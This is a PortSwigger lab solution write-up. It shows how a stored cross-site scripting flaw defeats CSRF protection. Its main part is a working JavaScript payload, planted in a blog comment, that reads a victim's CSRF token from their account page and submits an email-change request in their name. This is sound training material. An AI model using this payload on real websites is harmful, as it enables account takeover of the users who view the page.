## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/26c6204e-8658-4c2e-a811-9990eb2ca7c5)

## Solution :

Log in using the credentials provided. On your user account page, notice the function for updating your email address.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/23fa623a-9610-48d0-9067-3ea11ca475b5)

 ‘Your email is:’ has been updated to your new email.

 >what we see here is cross-site request forgery token and the idea  is we can't post to this particular endpoint and change our passward without the cross site request forgery token this really what stops us from being able change the email of anthor user because simply we won't have access to their cross -site request forgery token there is a situation where the token is not going to able to protect a user from someone changing their eamil and that if there is also a possible cross-site  scripting attack the idea behind
cross-site scripting attack is it can execute arbitary javascript in the victim's and it has access to the Dom and can access the cross-site request forgry token so javascript can take that token and submit a malicious request on behalf of the victim.

Crafting the Payload

```html
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>

```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/5b2d26c1-137b-438d-a7c2-a0abd2fc74cb)

This will make anyone who views the comment issue a POST request to change their email address to `test@test.com`

Lab Solved.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/452cd425-877c-46b8-8436-5cae335e9630)


